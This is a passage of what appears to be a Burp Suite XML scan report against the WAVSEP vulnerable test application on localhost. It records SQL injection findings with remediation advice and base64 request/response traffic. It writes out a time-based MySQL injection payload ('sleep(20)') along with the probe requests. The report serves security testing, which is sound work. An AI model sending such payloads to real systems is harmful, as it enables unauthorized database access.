<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMTo0NyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAxOjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDQgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogTGlzdGluZyBkYXRhYmFzZSBjb250ZW50czwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAyOjA4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDQgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogTGlzdGluZyBkYXRhYmFzZSBjb250ZW50czwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8119895511219387392</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case05-InjectionInSearch-ListingDatabaseTableColumns-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case05-InjectionInSearch-ListingDatabaseTableColumns-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20011</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlQ29sdW1ucy1VbmlvbkV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtVW5pb25FeHBsb2l0L0Nhc2UwNS1JbmplY3Rpb25JblNlYXJjaC1MaXN0aW5nRGF0YWJhc2VUYWJsZUNvbHVtbnMtVW5pb25FeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzowMSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlQ29sdW1ucy1VbmlvbkV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtVW5pb25FeHBsb2l0L0Nhc2UwNS1JbmplY3Rpb25JblNlY